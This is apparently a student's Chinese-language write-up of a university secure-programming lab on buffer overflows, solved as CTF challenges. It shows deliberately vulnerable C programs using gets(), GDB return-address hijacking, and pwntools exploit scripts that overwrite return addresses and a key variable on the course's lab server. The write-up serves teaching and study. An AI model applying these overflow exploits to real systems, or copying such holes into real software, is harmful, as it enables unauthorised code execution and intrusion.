---
title: '112-2 NTUT 安全程式設計 Lab - 字串安全與緩衝區溢位 writeup'
disqus: hackmd
---

112-2 NTUT 安全程式設計 Lab - 字串安全與緩衝區溢位 writeup
===

# Table of Contents

[TOC]

# GDB & Binary Exploitation Introduction
[Github](https://github.com/Chw41/Security-programming-2024/tree/main/String%20Safety%20and%20Buffer%20Overflow) & [HackMD](https://hackmd.io/@CHW/rJubmdv70)

# LAB 設計理念
![image](https://hackmd.io/_uploads/SypP1PvQ0.png)

>[!Note]
> gcc指令是用於編譯C或C++程式的GNU Compiler Collection（GCC）的命令行接口。通過gcc指令，您可以將源代碼文件編譯成可執行文件或共享庫，也可以對代碼進行調試和優化。

# ctfd
http://140.124.181.158/users
![image](https://hackmd.io/_uploads/BkWbdqPmC.png)


# Practice01
![image](https://hackmd.io/_uploads/BkcNsFv70.png)

practice01.c
```c=
int main(){
	int a = 0x123;
	int b = 0x456;
	printf("%d\n",a+b);
	return 0;
}
```

## Practice01 Solution
### Compiler
```
gcc -fno-stack-protector -z execstack -no-pie -o practice01 practice01.c
```
![image](https://hackmd.io/_uploads/ByIyRFwQR.png)
> `-fno-stack-protector`：不要在編譯時添加stack protector機制。這個選項禁用了這種保護機制，使得程序可以更容易地受到Stack Overflow攻擊。
> `-z execstack`: 告訴Linker（ld）允許stack上的代碼執行。當程序需要在運行時動態生成代碼時是必要的。
> `-o practice01`: 指定輸出文件的名稱為 practice01
> `practice01.c`: Source code文件的名稱
```
./practice01
```
![image](https://hackmd.io/_uploads/rkhPIcDXR.png)

## GET FLAG
> **FLAG: flag{1401}**

## Familiar environment

### 1. gdb
```
gdb -q ./practice01
```
![image](https://hackmd.io/_uploads/SJOuJqwXC.png)

#### 1.1 斷點 main()
```
gef➤  file practice01
gef➤  break main
```
![image](https://hackmd.io/_uploads/rkKR15DXC.png)
#### 1.2 執行
```
gef➤  r
```
![image](https://hackmd.io/_uploads/r1JEfqDmA.png)

#### 1.3 反組譯視窗
```
gef➤ disassemble main
```
![image](https://hackmd.io/_uploads/By_cz9PX0.png)

#### 1.4 觀察Register變化
```
gef➤ info registers
```
![image](https://hackmd.io/_uploads/S1Bym5v7C.png)
讓RIP執行到印出 a+b 之前，從disassemble步驟的反編譯程式碼可以看到 printf 是在 0x401155  (前面0可以省略表示)
### 2. 斷點 0x401155
```
gef➤ b *0x401155
```
![image](https://hackmd.io/_uploads/B1pjXcvXA.png)
```
gef➤ c #繼續執行
```
![image](https://hackmd.io/_uploads/B13WNqw7C.png)
> 可以看到中斷在 call 0x401030 <printf@plt>

#### 2.1 觀察Register變化
```
gef➤ info registers
```
![image](https://hackmd.io/_uploads/HJYJBcv7R.png)

#### 2.2 查看 stack 狀態
```
gef➤  x/10g $rsp
```
![image](https://hackmd.io/_uploads/HkwBB5vmC.png)


# Practice02
![image](https://hackmd.io/_uploads/r1ptwqDXR.png)

practice02.c
```c=
void sectoolstw(int a, int b){
	int c = 0x789;
	printf("%d\n", a+b+c);
}

int main(){
	int a = 0x123;
	int b = 0x456;
	sectoolstw(a,b);
	return 0;
}

```

## Practice02 Solution
### Compiler
```
gcc -fno-stack-protector -z execstack -no-pie -o practice02 practice02.c
```
![image](https://hackmd.io/_uploads/H1sSFmd70.png)

```
./practice02
```
![image](https://hackmd.io/_uploads/rJRPYXuQ0.png)

## GET FLAG
> **FLAG: flag{3330}**

## Familiar environment
### gdb

#### 1.1 info function
查看程序中定義的函數
```
gef➤  info function
```
![image](https://hackmd.io/_uploads/S1za-N_7A.png)
> main 與 sectoolstw (通常不會看到的function name)
> 可以從 main 的反編譯看到 sectoolstw

#### 1.2 disassemble
```
gef➤  disass main
```
![image](https://hackmd.io/_uploads/H1rPG4dQR.png)
> 接著觀察 sectoolstw 做了哪些事

```
gef➤ disassemble sectoolstw
```
![image](https://hackmd.io/_uploads/HyX2fVu7A.png)
```assembly
Dump of assembler code for function sectoolstw:
   0x0000000000001139 <+0>:     push   rbp
   0x000000000000113a <+1>:     mov    rbp,rsp
   0x000000000000113d <+4>:     sub    rsp,0x20
   0x0000000000001141 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000001144 <+11>:    mov    DWORD PTR [rbp-0x18],esi
   0x0000000000001147 <+14>:    mov    DWORD PTR [rbp-0x4],0x789
   0x000000000000114e <+21>:    mov    edx,DWORD PTR [rbp-0x14]
   0x0000000000001151 <+24>:    mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000001154 <+27>:    add    edx,eax
   0x0000000000001156 <+29>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001159 <+32>:    add    eax,edx
   0x000000000000115b <+34>:    mov    esi,eax
   0x000000000000115d <+36>:    lea    rax,[rip+0xea0]        # 0x2004
   0x0000000000001164 <+43>:    mov    rdi,rax
   0x0000000000001167 <+46>:    mov    eax,0x0
   0x000000000000116c <+51>:    call   0x1030 <printf@plt>
   0x0000000000001171 <+56>:    nop
   0x0000000000001172 <+57>:    leave
   0x0000000000001173 <+58>:    ret
End of assembler dump.

```
> 觀察 RIP 從 main function 進到 sectoolstw function，設斷點在call sectoolstw 上

#### 1.3 斷點 *0x1194

```
gef➤ b *0x401181
gef➤ r
```

# Practice03
![image](https://hackmd.io/_uploads/SyFQLVu7A.png)

practice03_do_not_compile_me.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
int Flag(void);
int Hi(void);
int main(void){
	Hi();
	char buf[12];
	gets(buf);
	return 0;
}
int Flag(void)
{
	printf("ZmxhZ3t0aGlzX2lzX25vdF9yZWFsX2ZsYWd9\n");
	printf("Please using base64 decode it.\n");
	return 0;
}
int Hi(void){
	printf("I will set the sea on fire!!\n");
}


```
>  在 main 中不會執行到Flag()?!!

## Practice03 Solution
### 1. NO Compiler
題目提供編譯好的 practice03
```
gdb -q practice03
```
![image](https://hackmd.io/_uploads/rJq1oE_mC.png)

>[!Important]
> 當 function return 時，會呼叫 ret，這個地方會 pop 出 next_rip 的位址。也就是回到 main 的方法。我們可以透過修改 rip 的方式 (rip是程式執行到哪邊的指標!)，直接指到 Flag 的 function。

**所以需要Hi() 的 ret 跟 Flag() 的位置。**
### 2. disass Hi() & Flag()
```
gef➤ disass Hi
```
![image](https://hackmd.io/_uploads/B1E9j4_Q0.png)
```
gef➤ disass Flag
```
![image](https://hackmd.io/_uploads/H19jiNuQR.png)

### 3. 斷點Hi ret
```
gef➤ b 0*0x401199
gef➤ r
```
![image](https://hackmd.io/_uploads/H1ajn4u7R.png)
> Permission denied

```
gef➤ quit

$ chmod +x practice03 

$ gdb -q practice03
```
> practice03 新增執行權限
> $ ls -al 檢查
```
gef➤ b 0*0x401199
gef➤ r
```
![image](https://hackmd.io/_uploads/HyKLC4uQC.png)
> rbp 指向 main 的 next_rip

### 4. 修改rip 指向
rip 指向 Flag()
![image](https://hackmd.io/_uploads/ryk1JH_7A.png)

```
gef➤ set $rip=0x40115b
c
```
![image](https://hackmd.io/_uploads/SJHQJBOQA.png)
> 成功導到Flag()

```
gef➤  set $rip=0x40115b
gef➤  c
Continuing.
ZmxhZ3twcm9mX2N5c3VuX3NjX2NvdXJzZV9pc19zb19nb29kX2FoYWhhaGF9
Please using base64 decode it.

```
### 5. Base64 decode
![image](https://hackmd.io/_uploads/BJtnyHd7R.png)

## GET FLAG
> **FLAG: flag{prof_cysun_sc_course_is_so_good_ahahaha}**

# Practice04
![image](https://hackmd.io/_uploads/rka6lrOQA.png)

practice04.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
int PrivateTest(void);
bool IsPasswordValid(void);
int main(void){
	bool PWverify;
	puts("Enter your password:");
	PWverify=IsPasswordValid();
	if(!PWverify){
		puts("Password Error!! Please try again.");
		return -1;
	}
	else puts("Welcome. Your password is correct.");
	return 0;
}
int PrivateTest(void)
{
	system("cat /home/hacker/flag");
	return 0;
}
bool IsPasswordValid(void){
	char Password[12];
	gets(Password);
	if(!strcmp(Password, "secure pro"))
		return(true);
	else return(false);
}


```

溫柔體貼的助教 [@stwater20](https://github.com/stwater20) 已經寫好腳本 exp1.py
```python=
from pwn import *


proc = process(["./practice04"])
#proc = remote("ctf.sectools.tw",1321)

input("[b4 sending]")

count = ??
ret_gadget = 0x40120b
target = ??

proc.sendline(b"A" *count+
		ret_gadget.to_bytes(8,"little")+
		target.to_bytes(8,"little")
		)
input("[aft sending]")
proc.interactive()

```

## Practice04 Solution
### 1. Code Review
practice04.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
int PrivateTest(void);
bool IsPasswordValid(void);
int main(void){   //使用IsPasswordValid() 驗證密碼
	bool PWverify;
	puts("Enter your password:");
	PWverify=IsPasswordValid();
	if(!PWverify){
		puts("Password Error!! Please try again.");
		return -1;
	}
	else puts("Welcome. Your password is correct.");
	return 0;
}
int PrivateTest(void) //使用system() 系統命令 cat flag 
{
	system("cat /home/hacker/flag");
	return 0;
}
bool IsPasswordValid(void){ //Password 12 Byte
	char Password[12];
	gets(Password);
	if(!strcmp(Password, "secure pro"))
		return(true);
	else return(false);
}
```

>[!Tip]
>透過輸入密碼欄位，利用Buffer overflow攻擊，將 IsPasswordVaild 的 return 指向 PrivateTest 

### 2. Buffer overflow
生成隨機長字串
```
gdb -q practice04
gef➤  gef config gef.debug True
gef➤  pattern create 50
```
![image](https://hackmd.io/_uploads/S1FtPIO70.png)
```
gef➤  run
Starting program: /home/hacker/Downloads/practice04 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your password:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
```
![image](https://hackmd.io/_uploads/SJgIOIuQR.png)
> 利用 pattern search 
```
gef➤  pattern search aaaadaaaaaaaeaaaaaaafaaaaaaaga
```
![image](https://hackmd.io/_uploads/SJMAdUdXC.png)
> 得到偏移量 offset 20


>[!Tip]
> 接著要尋找 IsPasswordValid() 的 ret & return address 要跳至 PrivateTest() 上

### 3. disass IsPasswordValid() & PrivateTest()
```
gef➤ IsPasswordValid
gef➤ PrivateTest
```
![image](https://hackmd.io/_uploads/rkon1DOXA.png)
> 得知:
> IsPasswordValid() ret: **0x40120b**
> PrivateTest() rbp: **0x4011ac**

### 4. exploit script
```
vi exp1.py
```

```python=
from pwn import *


#proc = process(["./practice04"])
proc = remote("140.124.181.158",1321) #remote ip

input("[b4 sending]") #在發送有效負載之前暫停，並顯示 [b4 sending]，提供手動檢查的機會

count = 20 #offset
ret_gadget = 0x40120b
target = 0x4011ac #target address

proc.sendline(b"A" *count+
		ret_gadget.to_bytes(8,"little")+
		target.to_bytes(8,"little")
		)
# b"A" * count：產生20個位元組的填滿字元 "A"。 
# ret_gadget.to_bytes(8, "little")：將 ret_gadget 位址轉換為8位元組的小端序位元組序列。 
# target.to_bytes(8, "little")：將 target 位址轉換為8位元組的小端序位元組序列。

input("[aft sending]")
proc.interactive()

```
```
python exp1.py
```
## GET FLAG
![image](https://hackmd.io/_uploads/rJltHPdmC.png)
> **FLAG: flag{buffer_overflow_is_soooooo_1asy}**

# Practice05
![image](https://hackmd.io/_uploads/SkX9_PdQC.png)

practice05.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("cat /home/hacker/flag2");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```

溫柔體貼的助教 [@stwater20](https://github.com/stwater20) 又寫好腳本 exp2.py
```python=
from pwn import *

proc = process(["./practice05"])
#proc = remote("192.168.12.131",1621)
input("[b4 sending]")

count = ?
payload = b"A" * count
target = 0x?
payload += target.to_bytes(8,"little")
#payload = "sdsd"
proc.sendline(payload)
proc.interactive()

```

## Practice05 Solution
### 1. Check file
觀察 practice05
```
file practice05
```
![image](https://hackmd.io/_uploads/rkGgeduQ0.png)

### 2. Code Review
practice05.c
```c=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("cat /home/hacker/flag2");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```
> 要讓 key = 0xcafebabe 才能取得 flag

### 3. Buffer overflow
生成隨機長字串
```
chmod +x practice05
gdb -q practice05
gef➤  gef config gef.debug True
gef➤  pattern create 50
```
![image](https://hackmd.io/_uploads/H1c3Duu7A.png)
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

```
gef➤  run
overflow me : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```
![image](https://hackmd.io/_uploads/SyzAKuOQ0.png)

### 4. Check key address
```
gef➤  disass func
```
![image](https://hackmd.io/_uploads/SkQd5Ou7C.png)
> if(key == 0xcafebabe)
> 在  0x080491b9 <+51>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
> 所以0xcafebabe = ebp+0x8

```
gef➤ p $ebp+0x8
```
![image](https://hackmd.io/_uploads/Hymcou_7C.png)

> $2 = (void *) 0x61616173

**HEX to ASCII:**
0x61616173 = aaas
> 跟輸入不一樣??!
> 認為沒蓋到，pattern 改成 100
> 還是無解


### 5. 通靈中..
![image](https://hackmd.io/_uploads/S1q-CFdQA.png)
> pattern 50 輸入
```
0xffffcfd0│+0x0000: 0xde00616d ("ma"?)   ← $esp
0xffffcfd4│+0x0004: 0xf7fc1678
0xffffcfd8│+0x0008: 0xf7fc1b40
0xffffcfdc│+0x000c: 0x8049204
0xffffcfe0│+0x0010: 0x00000001
0xffffcfe4│+0x0014: 0xffffd000
0xffffcfe8│+0x0018: 0x00000000
0xffffcfec│+0x001c: 0xf7c23295
```
```
pattern search ma
```
![image](https://hackmd.io/_uploads/ByYEg9d7A.png)
> 得到偏移量 offset 48

### 6. exploit script
```
vi exp2.py
```

```python=
from pwn import *

#proc = process(["./practice05"])
proc = remote("140.124.181.158",1621)
input("[b4 sending]")

count = 48   #offset
payload = b"A" * count
target = 0xcafebabe #key = 0xcafebabe，才顯示flag
payload += target.to_bytes(8,"little")
#payload = "sdsd"
proc.sendline(payload)
proc.interactive()
```
```
python exp2.py
```
### BTW
![image](https://hackmd.io/_uploads/B1-1Qc_QC.png)
> 同學分享 offset 48 :
> buffer = 32 
> saved rvp = 8
> return address = 8
> 32+8+8=48

## GET FLAG
![image](https://hackmd.io/_uploads/SJk5pYumA.png)
> **FLAG: flag{Sheng_Shan_will_set_the_sea_on_fire}**

# FINAL
![image](https://hackmd.io/_uploads/ryF9HcdQA.png)

